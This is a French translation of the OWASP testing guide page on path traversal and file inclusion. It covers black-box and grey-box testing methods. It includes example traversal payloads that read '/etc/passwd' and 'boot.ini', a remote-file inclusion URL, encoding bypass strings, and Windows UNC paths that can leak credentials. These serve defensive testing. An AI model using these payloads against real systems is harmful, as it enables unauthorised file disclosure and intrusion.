# Test de l'inclusion du fichier transversal du Directory

|ID          |
|------------|
|WSTG-ATHZ-01|

## Sommaire

De nombreuses applications Web utilisent et gèrent des fichiers dans le cadre de leur fonctionnement quotidien. En utilisant des méthodes de validation des entrées qui n'ont pas été bien conçues ou déployées, un agresseur pourrait exploiter le système afin de lire ou d'écrire des fichiers qui ne sont pas destinés à être accessibles. Dans des situations particulières, il pourrait être possible d'exécuter du code arbitraire ou des commandes système.

Traditionnellement, les serveurs Web et les applications Web implémentent des mécanismes d'authentification pour contrôler l'accès aux fichiers et aux ressources. Les serveurs Web essaient de confiner les fichiers des utilisateurs dans un "répertoire racine" ou "racine du document Web", qui représente un répertoire physique sur le système de fichiers. Les utilisateurs doivent considérer ce répertoire comme le répertoire de base dans la structure hiérarchique de l'application Web.

La définition des privilèges est faite à l'aide de listes de contrôle d'accès (ACL) qui identifient les utilisateurs ou les groupes censés pouvoir accéder, modifier ou exécuter un fichier spécifique sur le serveur. Ces mécanismes sont conçus pour empêcher les utilisateurs malveillants d'accéder à des fichiers sensibles (par exemple, le fichier commun `/etc/passwd` sur une plate-forme de type UNIX) ou pour éviter l'exécution de commandes système.

De nombreuses applications Web utilisent des scripts côté serveur pour inclure différents types de fichiers. Il est assez courant d'utiliser cette méthode pour gérer des images, des modèles, charger des textes statiques, etc. Malheureusement, ces applications exposent des failles de sécurité si les paramètres d'entrée (c'est-à-dire les paramètres de formulaire, les valeurs des cookies) ne sont pas correctement validés.

Dans les serveurs Web et les applications Web, ce type de problème survient dans les attaques par le chemin transversal/inclusion de fichier. En exploitant ce type de vulnérabilité, un attaquant peut lire des répertoires ou des fichiers qu'il ne peut normalement pas lire, accéder à des données en dehors de la racine du document Web ou inclure des scripts et d'autres types de fichiers provenant de sites Web externes.

Aux fins du Guide de test OWASP, seules les menaces de sécurité liées aux applications Web seront prises en compte et non les menaces aux serveurs Web (par exemple, le tristement célèbre code d'échappement `%5c` dans le serveur Web Microsoft IIS). D'autres suggestions de lecture seront fournies dans la section des références pour les lecteurs intéressés.

Ce type d'attaque est également connu sous le nom d'attaque point-point-barre (`../`), parcours de répertoire, escalade de répertoire ou retour en arrière.

Lors d'une évaluation, pour découvrir les failles du chemin transversal et d'inclusion de fichier, les testeurs doivent effectuer deux étapes différentes :

1. Énumération des vecteurs d'entrée (une évaluation systématique de chaque vecteur d'entrée)
2. Testing Techniques (une évaluation méthodique de chaque technique d'attaque utilisée par un attaquant pour exploiter la vulnérabilité)

## Objectifs des tests

- Identifier les points d'injection qui se rapportent au chemin transversal.
- Évaluer les techniques de contournement et identifier l'étendue du chemin transversal.

## Comment tester

### Test de la boîte noire

#### Énumération des vecteurs d'entrée

Afin de déterminer quelle partie de l'application est vulnérable au contournement de la validation des entrées, le testeur doit énumérer toutes les parties de l'application qui acceptent le contenu de l'utilisateur. Cela inclut également les requêtes HTTP GET et POST et les options courantes telles que les téléchargements de fichiers et les formulaires HTML.

Voici quelques exemples de vérifications à effectuer à ce stade :

- Existe-t-il des paramètres de requête qui pourraient être utilisés pour les opérations liées aux fichiers ?
- Existe-t-il des extensions de fichiers inhabituelles ?
- Existe-t-il des noms de variables intéressants ?
    - `http://exemple.com/getUserProfile.jsp?item=ikki.html`
    - `http://exemple.com/index.php?file=content`
    - `http://exemple.com/main.cgi?home=index.htm`
- Est-il possible d'identifier les cookies utilisés par l'application web pour la génération dynamique de pages ou de templates ?
    - `Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower`
    - `Cookie: USER=1826cc8f:PSTYLE=GreenDotRed`

#### Techniques de test

La prochaine étape des tests consiste à analyser les fonctions de validation des entrées présentes dans l'application Web. En utilisant l'exemple précédent, la page dynamique appelée `getUserProfile.jsp` charge les informations statiques d'un fichier et montre le contenu aux utilisateurs. Un attaquant pourrait insérer la chaîne malveillante `../../../../etc/passwd` pour inclure le fichier de hachage de mot de passe d'un système Linux/UNIX. Évidemment, ce type d'attaque n'est possible que si le point de contrôle de validation échoue ; selon les privilèges du système de fichiers, l'application Web elle-même doit pouvoir lire le fichier.

**Remarque :** Pour tester avec succès cette faille, le testeur doit connaître le système testé et l'emplacement des fichiers demandés. Il est inutile de demander `/etc/passwd` à partir d'un serveur Web IIS.

```text
http://exemple.com/getUserProfile.jsp?item=../../../../etc/passwd
```

Un autre exemple courant consiste à inclure du contenu provenant d'une source externe :

```text
http://exemple.com/index.php?file=http://www.owasp.org/malicioustxt
```

La même chose peut être appliquée aux cookies ou à tout autre vecteur d'entrée utilisé pour la génération de pages dynamiques.

Plus de charges utiles d'inclusion de fichiers peuvent être trouvées sur [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

Il est important de noter que différents systèmes d'exploitation utilisent différents séparateurs de chemin

- OS de type Unix :
    - répertoire racine : `/`
    - séparateur de répertoire : `/`
- Système d'exploitation Windows :
    - répertoire racine : `<lettre de lecteur> :`
    - séparateur de répertoire : `\` ou `/`
- macOS classique :
    - répertoire racine : `<lettre de lecteur> :`
    - séparateur de répertoire : `:`

C'est une erreur courante des développeurs de ne pas s'attendre à toutes les formes d'encodage et donc de ne valider que le contenu encodé de base. Si au début la chaîne de test échoue, essayez un autre schéma d'encodage.

Vous pouvez trouver des techniques d'encodage et des charges utiles de traversée de répertoire prêtes à l'emploi sur [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

#### Considérations spécifiques à Windows

- Shell Windows : l'ajout de l'un des éléments suivants aux chemins utilisés dans une commande shell n'entraîne aucune différence de fonction :
     - Chevrons `<` et `>` à la fin du chemin
     - Guillemets doubles (fermés correctement) à la fin du chemin
     - Marqueurs de répertoires courants superflus tels que `./` ou `.\\`
     - Marqueurs de répertoire parent superflus avec des éléments arbitraires qui peuvent ou non exister :
		- `file.txt`
        - `file.txt...`
        - `file.txt<spaces>`
        - `file.txt""""`
        - `file.txt<<<>>><`
        - `./././file.txt`
        - `nonexistant/../file.txt`
- API Windows : les éléments suivants sont ignorés lorsqu'ils sont utilisés dans une commande shell ou un appel d'API où une chaîne est prise comme nom de fichier :
     - périodes
     - les espaces
- Chemins de fichiers UNC Windows : utilisés pour référencer des fichiers sur des partages SMB. Parfois, une application peut faire référence à des fichiers sur un chemin de fichier UNC distant. Si tel est le cas, le serveur Windows SMB peut envoyer des informations d'identification stockées à l'attaquant, qui peuvent être capturées et piratées. Ceux-ci peuvent également être utilisés avec une adresse IP ou un nom de domaine auto-référentiel pour échapper aux filtres, ou utilisés pour accéder à des fichiers sur des partages SMB inaccessibles à l'attaquant, mais accessibles depuis le serveur Web.
    - `\\server_or_ip\path\to\file.abc`
    - `\\?\server_or_ip\path\to\file.abc`
- Espace de noms de périphérique Windows NT : utilisé pour faire référence à l'espace de noms de périphérique Windows. Certaines références autoriseront l'accès aux systèmes de fichiers en utilisant un chemin différent.
     - Peut être équivalent à une lettre de lecteur telle que `c:\`, ou même à un volume de lecteur sans lettre attribuée : `\\.\GLOBALROOT\Device\HarddiskVolume1\`
     - Fait référence au premier lecteur de disque de la machine : `\\.\CdRom0\`

### Test de la boîte grise

Lorsque l'analyse est effectuée avec une approche de test en boîte grise, les testeurs doivent suivre la même méthodologie que pour les tests en boîte noire. Cependant, comme ils peuvent consulter le code source, il est possible de rechercher les vecteurs d'entrée plus facilement et plus précisément. Lors d'une révision du code source, ils peuvent utiliser des outils simples (tels que la commande *grep*) pour rechercher un ou plusieurs modèles courants dans le code de l'application : fonctions/méthodes d'inclusion, opérations sur le système de fichiers, etc.

- `PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...`
- `JSP/Servlet: java.io.File(), java.io.FileReader(), ...`
- `ASP: include file, include virtual, ...`

En utilisant des moteurs de recherche de code en ligne (par exemple, [Searchcode](https://searchcode.com/)), il peut également être possible de trouver des failles de traversée de chemin dans les logiciels Open Source publiés sur Internet.

Pour PHP, les testeurs peuvent utiliser l'expression régulière suivante :

```text
(include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)
```

En utilisant la méthode de test de la boîte grise, il est possible de découvrir des vulnérabilités qui sont généralement plus difficiles à découvrir, voire impossibles à trouver lors d'une évaluation standard de la boîte noire.

Certaines applications Web génèrent des pages dynamiques à l'aide de valeurs et de paramètres stockés dans une base de données. Il peut être possible d'insérer des chaînes de traversée de chemin spécialement conçues lorsque l'application ajoute des données à la base de données. Ce type de problème de sécurité est difficile à découvrir car les paramètres à l'intérieur des fonctions d'inclusion semblent internes et **sûrs** mais ne le sont pas en réalité.

De plus, en examinant le code source, il est possible d'analyser les fonctions censées gérer les entrées non valides : certains développeurs tentent de modifier les entrées non valides pour les rendre valides, en évitant les avertissements et les erreurs. Ces fonctions sont généralement sujettes à des failles de sécurité.

Envisagez une application Web avec ces instructions :

```php
filename = Request.QueryString("file");
Replace(filename, "/","\");
Replace(filename, "..\","");
```

Le test de la faille est réalisé par :

```text
file=....//....//boot.ini
file=....\\....\\boot.ini
file= ..\..\boot.ini
```

## Outils

- [DotDotPwn - Le fuzzer de traversée de répertoire](https://github.com/wireghoul/dotdotpwn)
- [Path Traversal Fuzz Strings (from WFuzz Tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/Traversal.txt)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net)
- Outils d'encodage/décodage
- [Chercheur de chaînes "grep"](https://www.gnu.org/software/grep/)
- [DirBuster](https://wiki.owasp.org/index.php/Category:OWASP_DirBuster_Project)

## Références

- [PayloadsAllTheThings - Traversée de répertoires](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- [PayloadsAllTheThings - Inclusion de fichiers](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

### Papiers blanc

- [Injection HTTP POST de phpBB Attachment Mod Directory Traversal](https://seclists.org/vulnwatch/2004/q4/33)
- [Pseudonymes de fichiers Windows : Pwnage et Poésie](https://www.slideshare.net/BaronZor/windows-file-pseudonyms)
